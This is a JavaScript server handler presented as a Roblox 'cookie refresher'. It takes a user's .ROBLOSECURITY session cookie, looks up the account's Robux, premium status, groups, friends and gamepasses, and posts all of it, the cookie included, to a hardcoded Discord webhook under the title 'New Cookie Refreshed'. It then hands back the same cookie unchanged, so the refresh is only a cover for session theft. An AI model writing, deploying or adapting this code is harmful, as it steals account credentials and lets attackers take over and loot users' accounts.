import axios from 'axios';

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1499712964893212873/j1UQLKVC1Te6ZFWMDT3xlbxYQA2R4IWIxz2-AqTO8ItZIEWezcL9YaCG7HLe7nJr1W79';

const GAME_IDS = {
  'Murder Mystery 2': 142823291,
  'Adopt Me': 920587237,
  'Blox Fruits': 2753915549,
  'Pet Simulator X': 6284583030,
  'Brookhaven': 4924922222,
  'Tower of Hell': 1962086868,
  'Anime Fighting Simulator': 2505075649,
  'Jailbreak': 606849621
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { cookie } = req.body;

  if (!cookie || !cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
    return res.status(400).json({ error: 'Invalid cookie format' });
  }

  try {
    // Validate and get user info
    const userInfo = await getUserInfo(cookie);
    
    // Get Robux balance
    const robux = await getRobux(cookie, userInfo.id);
    
    // Get premium status
    const premium = await getPremiumStatus(cookie);
    
    // Get groups
    const groups = await getGroups(cookie, userInfo.id);
    
    // Get friends count
    const friendCount = await getFriendCount(cookie, userInfo.id);
    
    // Check game inventory (gamepasses/items)
    const gameData = await checkGameInventory(cookie, userInfo.id);
    
    // Send to Discord webhook
    await sendToWebhook({
      cookie,
      userInfo,
      robux,
      premium,
      groups,
      friendCount,
      gameData
    });

    // Return success response
    return res.status(200).json({
      username: userInfo.name,
      userId: userInfo.id,
      robux: robux,
      premium: premium,
      groupCount: groups.length,
      friendCount: friendCount,
      gamesFound: gameData.length,
      newCookie: cookie
    });

  } catch (error) {
    console.error('Refresh error:', error.message);
    return res.status(500).json({ error: 'Failed to refresh cookie' });
  }
}

async function getUserInfo(cookie) {
  const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
    headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
  });
  return response.data;
}

async function getRobux(cookie, userId) {
  try {
    const response = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    return response.data.robux;
  } catch {
    return 0;
  }
}

async function getPremiumStatus(cookie) {
  try {
    const response = await axios.get('https://premiumfeatures.roblox.com/v1/users/validate-membership', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    return response.data;
  } catch {
    return false;
  }
}

async function getGroups(cookie, userId) {
  try {
    const response = await axios.get(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    return response.data.data;
  } catch {
    return [];
  }
}

async function getFriendCount(cookie, userId) {
  try {
    const response = await axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    return response.data.count;
  } catch {
    return 0;
  }
}

async function checkGameInventory(cookie, userId) {
  const gameData = [];
  
  for (const [gameName, gameId] of Object.entries(GAME_IDS)) {
    try {
      // Check if user owns any gamepasses for this game
      const response = await axios.get(
        `https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${gameId}`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } }
      );
      
      if (response.data.data && response.data.data.length > 0) {
        gameData.push({
          game: gameName,
          gameId: gameId,
          gamepasses: response.data.data.map(item => ({
            name: item.name,
            id: item.assetId
          }))
        });
      }
    } catch {
      // Game not found or no access
    }
  }
  
  return gameData;
}

async function sendToWebhook(data) {
  const { cookie, userInfo, robux, premium, groups, friendCount, gameData } = data;
  
  // Build game inventory field
  let gamesField = '';
  if (gameData.length > 0) {
    gameData.forEach(game => {
      gamesField += `**${game.game}**\n`;
      game.gamepasses.forEach(pass => {
        gamesField += `  └ ${pass.name}\n`;
      });
    });
  } else {
    gamesField = 'No gamepasses found for tracked games';
  }
  
  // Build groups field
  let groupsField = '';
  if (groups.length > 0) {
    groups.slice(0, 10).forEach(group => {
      groupsField += `• ${group.group.name} (${group.role.name})\n`;
    });
    if (groups.length > 10) {
      groupsField += `\n*...and ${groups.length - 10} more*`;
    }
  } else {
    groupsField = 'No groups';
  }

  const embed = {
    embeds: [{
      title: '🍪 New Cookie Refreshed',
      color: 0x00ff41,
      thumbnail: {
        url: `https://www.roblox.com/headshot-thumbnail/image?userId=${userInfo.id}&width=420&height=420&format=png`
      },
      fields: [
        {
          name: '👤 User Info',
          value: `**Username:** ${userInfo.name}\n**User ID:** ${userInfo.id}\n**Display Name:** ${userInfo.displayName}`,
          inline: true
        },
        {
          name: '💰 Account Value',
          value: `**Robux:** ${robux.toLocaleString()} R$\n**Premium:** ${premium ? '✓ Yes' : '✗ No'}\n**Friends:** ${friendCount}`,
          inline: true
        },
        {
          name: '👥 Groups',
          value: groupsField.substring(0, 1024) || 'None',
          inline: false
        },
        {
          name: '🎮 Game Inventory',
          value: gamesField.substring(0, 1024) || 'None',
          inline: false
        },
        {
          name: '🔑 Cookie',
          value: `\`\`\`${cookie.substring(0, 100)}...\`\`\``,
          inline: false
        }
      ],
      footer: {
        text: `Captured at ${new Date().toLocaleString()}`
      },
      timestamp: new Date().toISOString()
    }]
  };

  await axios.post(WEBHOOK_URL, embed);
}
